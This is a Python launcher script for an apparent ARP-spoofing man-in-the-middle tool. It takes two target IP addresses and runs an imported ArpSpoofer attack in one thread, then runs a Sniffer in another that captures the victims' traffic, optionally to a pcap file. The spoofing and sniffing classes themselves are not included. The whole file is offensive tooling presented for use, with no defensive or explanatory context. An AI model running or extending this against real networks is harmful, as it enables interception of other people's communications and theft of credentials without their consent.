from classes.ArpSpoofer import ArpSpoofer
from classes.Sniffer import Sniffer
import threading
import time
import sys


def spoof_and_sniff(t1_ip, t2_ip, wrpcap):
    spoofer = ArpSpoofer(t1_ip, t2_ip)
    sniffer = Sniffer(t1_ip, t2_ip, write_to_pcap=wrpcap)

    print("Started Spoofing...")
    thr = threading.Thread(target=spoofer.attack, args=(), kwargs={})
    thr.start()
    time.sleep(2)

    print("Started Sniffing...")
    thr = threading.Thread(target=sniffer.sniff_packets, args=(), kwargs={})
    thr.start()


def is_ipv4(s):
    pieces = s.split('.')
    if len(pieces) != 4:
        return False
    try:
        return all(0 <= int(p) < 256 for p in pieces)
    except ValueError:
        return False


if __name__ == '__main__':
    if len(sys.argv) > 2 and is_ipv4(sys.argv[1]) and is_ipv4(sys.argv[2]):
        target_1_ip = sys.argv[1]
        target_2_ip = sys.argv[2]

        if len(sys.argv) > 3:
            write_to_pcap_file = (sys.argv[3] == "pcap")
        else:
            write_to_pcap_file = False

        spoof_and_sniff(target_1_ip, target_2_ip, write_to_pcap_file)
    else:
        print("Wrong parameters!")


